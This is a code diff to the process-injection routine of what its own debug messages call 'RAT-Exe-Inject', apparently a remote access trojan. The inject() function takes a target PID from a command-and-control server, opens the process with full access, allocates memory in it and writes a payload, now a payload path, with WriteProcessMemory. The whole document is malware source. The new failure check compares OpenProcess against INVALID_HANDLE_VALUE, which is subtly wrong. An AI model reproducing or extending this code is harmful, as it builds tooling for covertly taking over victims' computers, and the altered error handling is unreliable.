@@ -29,7 +29,7 @@ cleanup:
 
 
 // take PID from C2 to inject into 
-INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
+INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in char* payloadPath)
 {
 	INT status = ERROR_SUCCESS;
 	CHAR messageBuffer [MAX_BUFFER_SIZE];
@@ -44,7 +44,7 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 
 	//hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
 	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
-	if (hProcess == NULL)
+	if (hProcess == INVALID_HANDLE_VALUE)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
 		status = GetLastError();
@@ -66,10 +66,10 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	OutputDebugStringA("RAT-Exe-Inject::inject - Successfully allocated memory in target process\n");
 
 	// TODO: just change this to dll path? for payload bytes...
-	status = WriteProcessMemory(hProcess, baseAddress, payloadBytes, payloadSize, &numBytesWritten);
-	if (status == 0)
+	if(!WriteProcessMemory(hProcess, baseAddress, payloadPath, payloadSize, &numBytesWritten))
 	{
-		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to write payload into target process!\n");
+		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to write payload into target process! Error 0x%X\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
 		status = GetLastError();
 		goto cleanup;
 	}
